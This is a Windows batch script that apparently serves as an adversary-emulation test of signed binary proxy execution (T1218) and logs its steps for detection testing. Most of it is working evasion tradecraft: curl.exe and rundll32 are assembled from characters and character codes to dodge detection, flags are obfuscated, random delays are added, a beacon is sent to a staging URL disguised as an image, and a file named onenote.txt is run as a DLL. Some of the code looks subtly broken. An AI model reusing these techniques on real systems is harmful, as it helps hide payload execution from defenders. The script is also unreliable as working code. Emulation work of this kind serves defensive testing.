@echo off
SETLOCAL ENABLEDELAYEDEXPANSION

REM PHR_ placeholder assignments (plain literals - NEVER encode)
SET yktnwwf=%APPDATA%\7775\8a0b42aa
SET fpakbq=Macula-Stage0-7775
SET repbmqg=https://10.0.0.49
SET rdzgrnne=https://10.0.0.49/stage/2/icon.png?7775-10
SET omxgazu=BALAM-S2BO
SET yydue=10
SET edjwtl=onenote.txt
SET fpldhe=7775

REM Log file path using PHR_ variable
SET logfile=%APPDATA%\!yydue!\macula-simulations.log

REM Ensure log directory exists
if not exist "%APPDATA%\!yydue!\" mkdir "%APPDATA%\!yydue!\" >nul 2>nul

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_start=obfuscated_T1218>>> "!logfile!" 2>nul

REM Initial random delay (30-60 seconds)
SET /A iypnqa=%RANDOM% %% 31 + 30
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_start=!iypnqa!s>>> "!logfile!" 2>nul
timeout /t !iypnqa! /nobreak >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: initial_delay_complete>>> "!logfile!" 2>nul

REM Build curl.exe character-by-character
SET ucwcl=c
SET qbkog=u
SET jtqma=r
SET tqheg=l
SET curlbin=!ucwcl!!qbkog!!jtqma!!tqheg!.exe
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: lolbin_built=curl>>> "!logfile!" 2>nul

REM Obfuscate -k -s -o nul flags using string substitution
SET flagenc=Wm Yo Qg
SET flags=!flagenc:W=-!
SET flags=!flags:Y=s!
SET flags=!flags:Z=k!
SET flags=!flags:Q=o nul!
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: flags_decoded>>> "!logfile!" 2>nul

REM Heartbeat check using obfuscated curl
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_check_start=!rdzgrnne!>>> "!logfile!" 2>nul
!curlbin! !flags! "!rdzgrnne!"
SET ttpresult=1
SET errdetail=
if !ERRORLEVEL! NEQ 0 (
    SET ttpresult=0
    SET errdetail=connection_failed
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: heartbeat_check_complete=!ERRORLEVEL!>>> "!logfile!" 2>nul

REM TTP logging for heartbeat (T1218 preliminary check)
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set ttpdate=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2!
set tptime=!datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!ttpdate! !tptime!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttpresult!:"!errdetail!" >> "!logfile!" 2>nul

REM Delay between operations
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: inter_op_delay_start=12s>>> "!logfile!" 2>nul
ping -n 12 127.0.0.1 >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: inter_op_delay_complete>>> "!logfile!" 2>nul

REM Change to output directory
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_start=!yktnwwf!>>> "!logfile!" 2>nul
cd /d "!yktnwwf!" >nul 2>nul
if !ERRORLEVEL! NEQ 0 (
    echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_failed=!ERRORLEVEL!>>> "!logfile!" 2>nul
    SET ttpresult=0
    SET errdetail=dir_not_found
    goto ttp_log_final
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: chdir_complete>>> "!logfile!" 2>nul

REM Random delay (10-30 seconds)
SET /A vzkdlb=%RANDOM% %% 21 + 10
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_start=!vzkdlb!s>>> "!logfile!" 2>nul
CHOICE /C Y /N /D Y /T !vzkdlb! >nul
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: random_delay_complete>>> "!logfile!" 2>nul

REM Build Rundll32.exe using character codes
SET codes=82 117 110 100 108 108 51 50
SET rundll=
for %%c in (!codes!) do (
    cmd /C exit %%c
    set rundll=!rundll!!=ExitCodeAscii!
)
SET rundllbin=!rundll!.exe
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: lolbin_built=rundll32>>> "!logfile!" 2>nul

REM Execute DLL with obfuscated rundll32
SET fullpath=%WINDIR%\System32\!rundllbin!
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dll_load_start=!edjwtl!>>> "!logfile!" 2>nul
SET ttpresult=1
SET errdetail=
!fullpath! "!edjwtl!", DllMain
if !ERRORLEVEL! NEQ 0 (
    SET ttpresult=0
    SET errdetail=dll_load_failed
)
echo [%DATE% %TIME%][DEBUG][!omxgazu!]: dll_load_complete=!ERRORLEVEL!>>> "!logfile!" 2>nul

:ttp_log_final
REM Final TTP logging for DLL execution (T1218)
for /f "tokens=2 delims==" %%I in ('wmic os get localdatetime /value') do set datetime=%%I
set ttpdate=!datetime:~0,4!-!datetime:~4,2!-!datetime:~6,2!
set tptime=!datetime:~8,2!:!datetime:~10,2!:!datetime:~12,2!.!datetime:~15,3!
echo [!ttpdate! !tptime!][!omxgazu!]: !yydue!-!fpldhe!-T1218|Signed Binary Proxy Execution=!ttpresult!:"!errdetail!" >> "!logfile!" 2>nul

echo [%DATE% %TIME%][DEBUG][!omxgazu!]: script_complete>>> "!logfile!" 2>nul